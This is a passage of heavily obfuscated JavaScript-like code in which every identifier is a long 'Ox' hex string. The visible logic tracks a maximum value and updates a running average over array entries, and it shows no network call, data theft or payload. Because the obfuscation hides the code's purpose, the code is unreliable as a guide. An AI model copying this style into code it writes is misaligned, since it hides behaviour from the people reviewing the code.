Oxb4ea36a8164eae65881b55a78fe2ff3ad0e113c3e96df6c75064b35b2b8fcfafd527237415fca209c3f6a9f5058eca9779ba5cd923a0ff7590dd2bef1bfbbf87(Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a);if(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a > 0) { if(Oxeb450c9a3affde2653d1b094fc309a04afe54b841e422c369e982e779bf8cd58740eab37cdc79aba16c32d8c19f4499c143da02aa3c7426ad8fcc956d0d32242 < Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a) Oxeb450c9a3affde2653d1b094fc309a04afe54b841e422c369e982e779bf8cd58740eab37cdc79aba16c32d8c19f4499c143da02aa3c7426ad8fcc956d0d32242 = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a;}if(Oxeb450c9a3affde2653d1b094fc309a04afe54b841e422c369e982e779bf8cd58740eab37cdc79aba16c32d8c19f4499c143da02aa3c7426ad8fcc956d0d32242 > 0 && Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe > 1) {Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 = ((Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181*(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe-1))+Oxeb450c9a3affde2653d1b094fc309a04afe54b841e422c369e982e779bf8cd58740eab37cdc79aba16c32d8c19f4499c143da02aa3c7426ad8fcc956d0d32242)/Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe;}}}}